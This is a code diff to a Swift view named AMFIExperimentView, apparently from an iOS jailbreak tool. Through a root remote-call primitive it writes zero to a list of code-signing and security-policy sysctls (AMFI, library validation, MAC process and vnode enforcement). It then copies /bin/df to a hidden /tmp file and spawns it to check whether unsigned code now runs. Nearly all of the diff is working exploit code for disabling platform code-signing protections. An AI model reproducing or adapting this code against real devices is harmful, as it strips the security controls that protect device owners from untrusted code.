@@ -2775,7 +2775,15 @@ struct AMFIExperimentView: View {
             ("security.mac.amfi.enforce", 0),
             ("kern.cs_force_kill", 0),
             ("kern.cs_force_hard", 0),
+            ("vm.cs_enforcement_panic", 0),
+            ("vm.cs_library_validation", 0),
+            ("vm.cs_require_lv", 0),
+            ("proc.cs_enforcement", 0),
+            ("vm.shared_region_unnest_logging", 0),
+            ("security.mac.proc_enforce", 0),
+            ("security.mac.vnode_enforce", 0),
         ]
+        var totalWritten = 0
         for (name, val) in extraSysctls {
             let nAddr = remote_alloc_str(rc, name)
             let vAddr = mem + 0x1A00
@@ -2783,8 +2791,56 @@ struct AMFIExperimentView: View {
             let r = RootExecutor.rcall(rc, "sysctlbyname", nAddr, 0, 0, vAddr, 4)
             if r == 0 {
                 detail += "✅ WROTE \(name) = \(val)\n"
+                totalWritten += 1
             }
             RootExecutor.rcall(rc, "free", nAddr)
+        }
+        
+        // NOW: with ALL protections disabled, try spawn UNSIGNED binary again
+        if totalWritten > 0 {
+            detail += "\n\(totalWritten) sysctls disabled! Re-testing spawn...\n"
+            
+            // Re-copy and try spawn
+            let src2 = remote_alloc_str(rc, "/bin/df")
+            let dst2 = remote_alloc_str(rc, "/tmp/.dsp_final_test")
+            RootExecutor.rcall(rc, "unlink", dst2)
+            
+            let sf = RootExecutor.rcall(rc, "open", src2, UInt64(O_RDONLY), 0)
+            let df2 = RootExecutor.rcall(rc, "open", dst2, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+            if sf != UInt64(bitPattern: -1) && df2 != UInt64(bitPattern: -1) {
+                let buf = mem + 0x800
+                for _ in 0..<50 {
+                    let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
+                    if n == 0 || n > 2048 { break }
+                    RootExecutor.rcall(rc, "write", df2, buf, n)
+                }
+                RootExecutor.rcall(rc, "close", sf)
+                RootExecutor.rcall(rc, "close", df2)
+                
+                let av = mem + 0x1C00
+                rc[av].setValue64(dst2)
+                rc[av + 8].setValue64(0)
+                let pv = mem + 0x1E00
+                rc[pv].setValue64(0)
+                
+                let finalRet = RootExecutor.rcall(rc, "posix_spawn", pv, dst2, 0, 0, av, 0)
+                RootExecutor.rcall(rc, "usleep", 500000)
+                let finalWait = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+                
+                detail += "FINAL spawn(copy): ret=\(finalRet), wait=\(finalWait)\n"
+                if finalRet == 0 {
+                    detail += "\n🎉🎉🎉🎉🎉 UNSIGNED BINARY RUNS!!! 🎉🎉🎉🎉🎉\n"
+                    detail += "FULL JAILBREAK ACHIEVED!!!\n"
+                    detail += "ALL CODE SIGNING BYPASSED!!!\n"
+                } else {
+                    detail += "Still blocked (ret=\(finalRet))\n"
+                    detail += "AMFI MAC policy still active (needs kernel patch)\n"
+                }
+                
+                RootExecutor.rcall(rc, "unlink", dst2)
+            }
+            RootExecutor.rcall(rc, "free", src2)
+            RootExecutor.rcall(rc, "free", dst2)
         }
         
         let hasSuccess = detail.contains("🎉") || detail.contains("✅ WROTE")
